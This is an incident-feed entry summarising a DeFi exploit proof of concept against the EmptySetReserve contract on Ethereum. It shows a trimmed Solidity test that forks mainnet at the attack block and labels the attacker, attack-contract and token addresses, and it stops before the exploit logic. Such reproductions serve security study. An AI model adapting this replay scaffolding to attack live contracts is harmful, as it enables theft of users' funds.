# [?] EmptySetReserve - Fixed Order Swap

## Summary
Severity: Unknown
Chain: Ethereum
Component: EmptySetReserve
Published: 2025-07-24
Source: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/EmptySetReserve_exp.sol
Type: defi-exploit-poc

## Details
Lost: $1,509.78

```solidity
contract ContractTest is BaseTestWithBalanceLog {
    address private constant ATTACKER = 0xdDEB9e72fbecCa668fFD47314565954347ade522;
    address private constant TRACE_ATTACK_CONTRACT = 0x17E2c0844AE7CfE9D0B04cA923017F4892824E15;
    address private constant RESERVE_IMPL = 0x363aF3acFfEd0B7181C2E3c56C00922E142100a8;

    IEmptySetReserve private constant RESERVE = IEmptySetReserve(0xD05aCe63789cCb35B9cE71d01e4d632a0486Da4B);
    IERC20 private constant USDC = IERC20(0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48);
    IERC20 private constant DSU = IERC20(0x605D26FBd5be761089281d5cec2Ce86eeA667109);
    IERC20 private constant ESS = IERC20(0x24aE124c4CC33D6791F8E8B63520ed7107ac8b3e);
    IERC20 private constant COMP = IERC20(0xc00e94Cb662C3520282E6f5717214004A7f26888);

    uint256 private constant FORK_BLOCK = 22_988_103;
    uint256 private constant TRACE_ETH_TRANSFER = 415_688_696_263_702_812;
    uint256 private constant LOCAL_REPLAY_PROFIT = 416_271_181_367_327_696;
    uint256 private constant LOCAL_REPLAY_ESS_RESIDUAL = 204_890_442_016_374_993_231_659;
    uint256 private constant TRACE_ORDER_PRICE = 267_010_781_166_742_363_801_758;
    uint256 private constant TRACE_ORDER_AMOUNT = 41_581_642_538_295_042_665;

    function setUp() public {
        vm.createSelectFork("mainnet", FORK_BLOCK);

        fundingToken = address(0);
        attacker = ATTACKER;

        vm.label(ATTACKER, "EOA attacker");
        vm.label(TRACE_ATTACK_CONTRACT, "trace attack contract");
        vm.label(address(RESERVE), "Empty Set Reserve proxy");
        vm.label(RESERVE_IMPL, "Empty Set Reserve implementation");
        vm.label(address(USDC), "USDC");
        vm.label(address(DSU), "DSU");
        vm.label(address(ESS), "ESS");
        vm.label(address(COMP), "COMP");
    }

    function testExploit() public balanceLog {
```

_Trimmed to 38 lines — full report: https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2025-07/EmptySetReserve_exp.sol_
